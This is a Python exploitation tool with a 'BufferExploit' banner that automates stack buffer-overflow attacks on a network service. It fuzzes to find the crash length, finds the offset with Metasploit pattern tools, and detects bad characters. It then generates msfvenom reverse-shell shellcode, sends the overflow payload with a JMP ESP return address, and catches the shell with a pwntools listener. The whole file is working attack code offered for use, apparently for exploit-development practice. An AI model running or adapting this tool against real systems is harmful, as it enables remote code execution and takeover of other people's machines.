#!/usr/bin/python

import sys, socket, argparse, subprocess
from binascii import hexlify 
from colorama import Fore, Back, Style, init
import codecs
import logging, time
from random import randint
import struct, threading
from pwn import *

#Logs
logging.basicConfig(filename='logs', 
                    level=logging.INFO,
                    format='%(asctime)s %(message)s',
                    datefmt='%d/%m/%Y %I:%M:%S %p')

init(autoreset=True) # Colorama auto reset settings

badcharlist = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

parser = argparse.ArgumentParser()

exploit_opts = parser.add_argument_group("Explotation Settings/Configurations")
exploit_opts.add_argument('-c', '--crash', help='Crash length',type=int)
exploit_opts.add_argument('-ebp', '--ebp', help='Offset of crash',type=int)
exploit_opts.add_argument('-eip', '--eip', help='ESP Address')
exploit_opts.add_argument('-b','--bad-chars', help='Specify the found badcharacter eg: "\\x00"')
exploit_opts.add_argument('--timeout', help='Connection timeout',default=10,type=int)
exploit_opts.add_argument('--nops', help='Add no of Nops',default=12,type=int)

revshell_opts = parser.add_argument_group("Reverse shell settings")
revshell_opts.add_argument('-L', '--LHOST', help='Local address for reverse shell')
revshell_opts.add_argument('-P', '--LPORT', help='Local Port for reverse shell')
revshell_opts.add_argument('-t', '--target', help='Target Operating system', choices=["windows","linux"], default="windows")
revshell_opts.add_argument('-a', '--arch', help='Target Operating system', choices=["x86","x64"], default="x86")

binary_opts = parser.add_argument_group("Binary Options")
binary_opts.add_argument('--cmd', help='Prefix command',default="")
binary_opts.add_argument('target_ip', help='Target IP address')
binary_opts.add_argument('target_port', help='Target Port',type=int)

args = parser.parse_args()
crash = args.crash # Size of the total payload when EXE crashed
ebp = args.ebp # Total Size of the EBP
eip = args.eip # Address of JMP ESP to be replaced in EIP
bad_chars = args.bad_chars

nops = args.nops # Size of NOPS
cmd = args.cmd # Vulnerable Command - Perfix
timeout = args.timeout # Seconds
target = args.target
arch = args.arch
LHOST = args.LHOST
LPORT = args.LPORT
IP = args.target_ip
PORT = args.target_port

def banner():
    print(Fore.CYAN+'''
        
██████╗ ██╗   ██╗███████╗███████╗███████╗██████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔══██╗██║   ██║██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██████╔╝██║   ██║█████╗  █████╗  █████╗  ██████╔╝███████╗██████╔╝██║     ██║   ██║██║   ██║   
██╔══██╗██║   ██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
██████╔╝╚██████╔╝██║     ██║     ███████╗██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   
╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                                                 
        ''')

def find_crash():
    global crash
    logging.info('Creating Buffer array with different Buffer size')
    buffer = ["A"*i for i in range(100,10000,100)]
    for string in buffer:
        logging.info("Fuzzing with {} bytes".format(len(string)))
        print(Fore.BLUE + "Fuzzing with %s bytes"%len(string))
        
        try:
            logging.info("Trying to connect to {}:{}".format(IP,PORT))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((IP, PORT))
            s.send(bytes(cmd + string,"latin-1"))
            s.recv(1024)
            
        except Exception as e:
            crash = len(string)
            error = str(e).split("]")[-1].strip()
            logging.info("Socker Error : {}".format(error))
            logging.info("Program crashed while sending {} bytes".format(len(string)-100))
            
            if len(string)-100 > 0 :
                print(Fore.GREEN + "Program crashed while sending %s bytes"% str(len(string)-100))
            else:
                print(Fore.RED + "Error : "+ error)
                sys.exit(1)
            
            return 
        s.close()
    else:
        print(Fore.YELLOW+"Counter buffer did not crash, update the counter limit in script and Rerun")

def sendPayload(buffer):
    try:
        logging.info("Sending the Payload")
        logging.info("Payload: {}".format(buffer))
        
        print(Fore.BLUE + "Sending Payload ....")
        payload = cmd + buffer
        
        logging.info("Trying to connect to {}:{}".format(IP,PORT))
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.settimeout(timeout)
        s.send(bytes(payload,"latin-1"))
        s.recv(1024)
        print(Fore.GREEN + "Payload Sent!")
        s.close()
    except socket.error as e:
        logging.info("Socker Error : {}".format(str(e).split("]")[-1]))
        
    except Exception as e:
        logging.info("Exception : Service is crashed or not Running")
        print(Fore.YELLOW + "Either the service crashed or it's not running")

def pattern_create():
    global crash
    logging.info("Creating a pattern of length : {}".format(crash))
    
    print("Creating pattern of Length " + str(crash))
    pattern = subprocess.run(["msf-pattern_create -l %s"%crash], shell=True, stdout=subprocess.PIPE)
    pattern = pattern.stdout.decode('latin-1').strip()
    
    logging.info("Sending the Pattern to Host")
    sendPayload(pattern)

def pattern_offset(offset):
    global ebp
    logging.info("Finding the offset address for {}".format(offset))
    
    print("Finding the offset address for " + offset)
    offset = subprocess.run(["msf-pattern_offset -q %s"%offset], shell=True, stdout=subprocess.PIPE)
    
    output = offset.stdout.decode('latin-1')
    print(output)
    if "No exact matches" in output:
        print("Invalid EBP")
        exit(1)
    ebp = int(output.split()[-1])

def send_badchars():
    logging.info("Sending Badchars")
    logging.info("Badchars : {}".format(badcharlist))
    
    print("Sending Badchars")
    buffer = "\x41" * ebp + "\x42" * 4 + "\x90" * nops + badcharlist + "\x43" * ( crash - ebp - 4 - nops)
    sendPayload(str(buffer))

def shellcode():
    global LHOST, LPORT, eip
    if LHOST == None or LPORT == None:
        if input("LHOST and LPORT are not set do you want to get value automatically using hostname (Y/n)? ").strip().lower() == "y":
            print(Fore.YELLOW+"\nNo LHOST and LPORT value are set so find by hostname")
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            LHOST = s.getsockname()[0]
            with socket.socket() as s:
                s.bind(('',0))
                LPORT = s.getsockname()[1]
                s.close()
            print(f"LHOST: {LHOST} LPORT: {LPORT}")
        else:
            print("Specific LHOST and LPORT in arguments")
            exit(1)
            
    logging.info("Shellcode Exploit")
    logging.info("Cooking Shellcode.....")
    print(Fore.BLUE+"Generating shellcode for Exploitation......")

    payload = f"{target}/{f'{arch}/' if arch == 'x64' else ''}shell_reverse_tcp"
    shellcode = subprocess.run([f"msfvenom -a {arch} -p {payload} LHOST={LHOST} LPORT={LPORT} -b '{bad_chars}' -f c EXITFUNC=thread --platform {target}"], shell=True, stdout=subprocess.PIPE)
    shellcode = shellcode.stdout.decode('latin-1')
    shellcode = shellcode.split("\n",1)[1]
    shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
    shellcode=codecs.decode(shellcode, 'unicode_escape')
    
    eip = "0x"+eip.replace('\\x','')
    eip = struct.pack("<I",int(eip, 16)).decode("latin-1")
    buffer = "\x41" * ebp + eip + "\x90" * nops + str(shellcode) + "\x43" * ( crash - ebp - 4 - nops)
    
    logging.info("Shellcode: {}".format(shellcode))

    def send_exploit(buffer):
        time.sleep(2)
        print(Fore.YELLOW+"Sending Exploit....")
        sendPayload(buffer)
        print(Fore.YELLOW + "Exploit Sent! Fingers crossed")

    handler = input("Do you want a interactive reverse shell handler (Y/n): ").strip().lower() == "y" 
    if not handler:
        print(Fore.YELLOW+"\nSetup your listener now.")
    
    thread = threading.Thread(target=send_exploit,args=(buffer,))
    thread.start()
    if handler:
        l = listen(int(LPORT))
        l.wait_for_connection()
        l.newline = b"\r\n"
        l.interactive()
    thread.join()

def main():
    if not args.cmd:
        print(Fore.YELLOW + "Warning: Empty Command")

    if not crash:
        print(Fore.YELLOW+"\nNo Crash value specified so testing crash value")
        find_crash()

        print(Fore.CYAN+"\nPlease restart the vulnerable application and your debugger. Press enter to continue")
        input()

    global eip
    if not ebp:
        print(Fore.YELLOW+"\nNo EBP value specified so sending random pattern of crash size")
        pattern_create()

        eip = input("Please enter the value shown in the EIP(Big Endian): ")
        pattern_offset(eip)
    
        print(Fore.CYAN+"\nPlease restart the vulnerable application and your debugger. Press enter to continue")
        input()

    global bad_chars,badcharlist
    if not bad_chars:
        print(Fore.YELLOW+"\nNo BadCharacters specified so sending all bad characters")
        send_badchars()
        print(Fore.CYAN+"\nCopy/Paste Stack value from ESP and type EOF to stop\n(Stack value will be from 90 to 43 sequence)\n")

        while True:
            line = input().strip()
            if line == "EOF":
                break

            try:
                data = line.split()[1]
                for i in range(0,len(data),2):

                    hexchar = chr(int(f"0x{data[i:i + 2]}", 16))
                    if hexchar in badcharlist:
                        badcharlist = badcharlist.replace(hexchar,"")
            except:
                pass

        bad_chars = "\\x00" + "".join([str(hex(ord(i))).replace("0x","\\x") for i in badcharlist])
        print(Fore.BLUE+"Bad Characters: ",bad_chars)

    if not eip:
        print(Fore.YELLOW+"\nNo EIP value specified, So let's find EIP value")
        print(Fore.GREEN+f"Help Command: !mona jmp -r esp -cpb \"{bad_chars}\"")
        eip = input("ESP: ")
        #EIP = "\\x".join([esp[i:i + 2] for i in range(0, len(esp), 2)][::-1]) # Little Endian Converstion

        print(Fore.CYAN+"\nPlease restart the vulnerable application and your debugger. Press enter to continue")
        input()

    if input("Do you want to exploit program with shellcode (Y/n)?: ").strip().lower() == "y":
        shellcode()

if __name__ == '__main__':    
    banner()
    main()